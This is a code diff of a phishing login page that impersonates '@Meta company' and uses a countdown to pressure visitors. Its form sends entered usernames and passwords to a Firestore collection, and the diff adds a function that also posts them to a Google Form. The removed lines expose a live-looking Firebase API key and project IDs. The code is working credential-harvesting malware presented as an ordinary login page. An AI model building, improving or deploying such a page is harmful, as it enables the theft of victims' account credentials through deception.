@@ -34,65 +34,47 @@
         <button type="submit">Login</button>
     </form>
 
-    <!-- Firebase & Firestore Scripts -->
+    <!-- ✅ Firebase Scripts (Correct Versions) -->
     <script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js"></script>
 
     <script>
-        // Initialize Firebase
+        // ✅ Initialize Firebase Correctly
         const firebaseConfig = {
-  apiKey: "AIzaSyA539oRhSFY_3gAZgRZ1_ec6yZI_6dcuWw",
-  authDomain: "login-system-4905a.firebaseapp.com",
-  projectId: "login-system-4905a",
-  storageBucket: "login-system-4905a.firebasestorage.app",
-  messagingSenderId: "647558155220",
-  appId: "1:647558155220:web:d99b742f0d171a6015a441"
-};
-
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT.appspot.com",
+            messagingSenderId: "YOUR_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
 
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        // Handle form submission
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault();
+        // ✅ Ensure JavaScript Runs AFTER Page Load
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("loginForm").addEventListener("submit", function(event) {
+                event.preventDefault();
 
-            // Get form values
-            const username = document.getElementById("username").value;
-            const password = document.getElementById("password").value;
+                const username = document.getElementById("username").value;
+                const password = document.getElementById("password").value;
 
-            // Store login data in Firestore
-            db.collection("users").add({
-                username: username,
-                password: password
-            }).then(() => {
-                alert("Login data saved successfully!");
-            }).catch((error) => {
-                console.error("Error saving data: ", error);
+                // ✅ Store Data in Firestore (Correctly!)
+                db.collection("users").add({
+                    username: username,
+                    password: password
+                }).then(() => {
+                    alert("Login data saved successfully!");
+                }).catch((error) => {
+                    console.error("Error saving data: ", error);
+                });
             });
         });
     </script>
+</body>
+</html>
 
-           
-        <p id="message" style="color: red; margin-top: 10px;"></p>
-    </div>
-    <!-- Warning Section -->
-    <div class="warning">
-        <i class="fas fa-exclamation-triangle danger-icon"></i>
-        <p>⚠️Please join the group within the given time! <span id="countdown">60</span></p>
-    </div>
-    <div class="meta">
-    <p>
-     @Meta company
-    </p>
-    </div>
-
-    <!-- Countdown Timer -->
-    <script>
         let timeLeft = 60;
         const countdownElement = document.getElementById("countdown");
 
@@ -120,9 +102,23 @@ const app = initializeApp(firebaseConfig);
             }
         });
         
+function sendDataToGoogleForms() {
+    var formData = new FormData();
+    formData.append("entry.1507447575", document.getElementById("username").value); // Replace entry ID
+    formData.append("entry.448198263", document.getElementById("password").value); // Replace entry ID
 
- 
+    fetch("YOUR_GOOGLE_FORM_URL", {
+        method: "POST",
+        body: formData
+    }).then(response => console.log("Form submitted successfully!"))
+    .catch(error => console.error("Error:", error));
+}
+
+
+
+
     </script>
+
 </body>
 
 
